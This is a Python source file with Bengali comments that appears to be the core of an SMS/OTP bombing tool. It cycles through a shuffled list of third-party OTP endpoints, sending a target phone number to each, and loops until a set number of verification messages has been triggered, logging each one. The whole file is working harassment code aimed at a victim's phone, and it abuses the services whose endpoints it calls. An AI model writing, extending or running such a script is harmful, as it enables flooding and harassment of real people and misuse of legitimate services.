import requests
import random
import time
from apis import APIS


def send_one(phone: str) -> bool:
    """
    আগের মতোই:
    - সব API shuffle হবে
    - যেকোনো ১টা TRUE হলেই return True
    - কোনো extra send logic নাই
    """
    apis = APIS.copy()
    random.shuffle(apis)

    for api in apis:
        try:
            payload = api["payload"](phone)

            # 🔑 ONLY CHANGE: GET vs POST
            if api["method"].upper() == "GET":
                r = requests.get(
                    api["url"],
                    params=payload,
                    timeout=10
                )
            else:
                r = requests.post(
                    api["url"],
                    json=payload,
                    timeout=10
                )

            if api["success"](r):
                return True

        except:
            pass

    return False


def send_exact(phone: str, total: int, delay: float):
    """
    🔒 এই function একদম আগের মতোই:
    - sent < total না হওয়া পর্যন্ত loop
    - ১টা OTP = ১টা success
    - fail হলে retry (কিন্তু sent বাড়ে না)
    - total এর বেশি কখনো যাবে না
    """
    sent = 0
    logs = []

    while sent < total:
        ok = send_one(phone)

        if ok:
            sent += 1
            logs.append(f"✅ {sent}/{total} OTP SENT (TRUE)")
        else:
            logs.append(f"❌ {sent+1}/{total} OTP FAILED (FALSE)")

        time.sleep(delay)

    return sent == total, logs
